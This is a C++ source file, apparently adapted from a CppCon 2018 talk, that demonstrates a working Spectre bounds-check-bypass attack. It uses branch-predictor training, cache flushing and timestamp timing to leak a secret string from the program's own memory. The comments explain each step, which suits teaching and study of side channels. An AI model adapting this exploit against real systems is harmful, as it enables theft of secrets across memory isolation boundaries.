/*
 * spectre.cpp
 *      Demo of spectre attack
 *
 * code taken from cppcon 2018 chandler carruth spectre talk
 */

#include <algorithm>
#include <array>
#include <cstring>
#include <iostream>
#include <numeric>
#include <string_view>
#include <tuple>

#ifdef __linux__
#include <x86intrin.h>
#elif _WIN32
#include <intrin.h>
#endif

static constexpr std::string_view text_table[] = {
    "Hello World!",
    "Hello GitHub",
    "This is my secret!"
};

static void force_read(uint8_t *p) {
#ifdef __linux__
    asm volatile("" : : "r"(*p) : "memory");
#elif _WIN32
    __asm mov eax, p
    __asm mov eax, [eax]
#endif
}

static int64_t read_tsc() {
    unsigned int junk;
    return __rdtscp(&junk);
}

template <typename RangeT>
static std::pair<int, int> top_two_indices(const RangeT &range) {
    int j{ 0 }, k{ 0 };
    for (unsigned int i{ 0 }; i < range.size(); i++) {
        if (range[i] > range[j]) {
            k = j;
            j = i;
        }
        else if (range[i] > range[k]) {
            k = i;
        }
    }
    return { j, k };
}

/*
 * Use spectre to leak text[index], even though index is out of range
 * and the accesses to text[] are always checked to be in range.
 * In a real attack the attacker would be flushing cache and measuring while
 * the victim is doing the in-bounds and occasionally out of bounds data-dependent read.
 * In this demo they are done together in the ideal order for the attacker.
 */
char leak_byte(std::string_view text, int index) {
    constexpr auto stride = 512; // 8 way-associative L1 cache has 8 cache lines in a row, each cache lins is 64 bytes
    constexpr auto timing_array_size = 256; // this one must be the number of all possible values of a single byte 2^8 = 256
    constexpr auto data_dependent_reads = 100; // at least 1 read is enough to get text[index] byte into CPU cache, but the more the better

    static uint8_t timing_array[timing_array_size * stride];
    memset(timing_array, 1, sizeof timing_array);

    const char* data = &text[0];
    int* size_in_heap = new int(text.size()); // contrived to make access slow

    std::array<int64_t, timing_array_size> latencies{};
    std::array<int, timing_array_size> scores{};
    int best_val{ 0 }, runner_up_val{ 0 };

    for (int run{ 0 }; run < 100; run++) { // more runs means more precise results, original had value 1000, but 100 is enough on my system
        // flush all of timing array
        for (int i{ 0 }; i < timing_array_size; i++)
            _mm_clflush(&timing_array[i * stride]);

        int safe_index = run % text.size(); // always inbound for the string view passed in!

        // perform reads that are data-dependent on the secret
        // as a program being attacked might
        for (int i{ 0 }; i < data_dependent_reads; i++)
            force_read(&timing_array[data[index] * stride]);
        
        for (int i{ 0 }; i < 500; i++) {
            _mm_clflush(size_in_heap);

            // original had a delay here, but it doesnt seem to be necessary on my system
            //for(volatile int z = 0; z < 1000; z++) { /* delay! */ }

            /*
             * This is a data-dependent read, but because of bounds checking
             * it doesnt (normally) leak the secret. However, speculative execution
             * can make the body of the "if" execute and cause cache effects even
             * when the condition is false! hence it can leak the secret.
             * The local_index is usually safe to train the predictor that the if statement
             * is usually true.
             */
            int local_index = ((i + 1) % 10) ? safe_index : index;
            if (local_index < *size_in_heap)
                force_read(&timing_array[data[local_index] * stride]);
        }

        // now measure read latencies to see if we can detect what data[index] was
        for (int i{ 0 }; i < timing_array_size; i++) {
            int mixed_i = ((i * 167) + 13) & 0xff; // ???, I guess so we test in pseudo-random order?
            uint8_t* timing_entry = &timing_array[mixed_i * stride];
            int64_t start = read_tsc();
            force_read(timing_entry);
            latencies[mixed_i] = read_tsc() - start;
        }

        // score anything that stands out
        int64_t avg_latency = std::accumulate(latencies.begin(), latencies.end(), (uint64_t)0) / timing_array_size;
        for (int i{ 0 }; i < timing_array_size; i++) {
            if (latencies[i] < (avg_latency * 3 / 4) && i != data[safe_index])
                scores[i]++;
        }

        // see if any score is significantly better than the rest
        std::tie(best_val, runner_up_val) = top_two_indices(scores);
        if (scores[best_val] > (2 * scores[runner_up_val] + 400))
            break;
    }

    return char(best_val);
}

int main(int argc, char** argv) {
    std::string leaked_string{};

    for (long i = &text_table[2][0] - &text_table[1][0]; i < &text_table[2][0] + text_table[2].size() - &text_table[1][0]; ++i) {
        leaked_string.push_back(leak_byte(text_table[1], i)); // never indexes the secret 3rd string!
    }

    std::cout << "Speculatively leaked string: " << leaked_string.c_str() << std::endl;

    return 0;
}
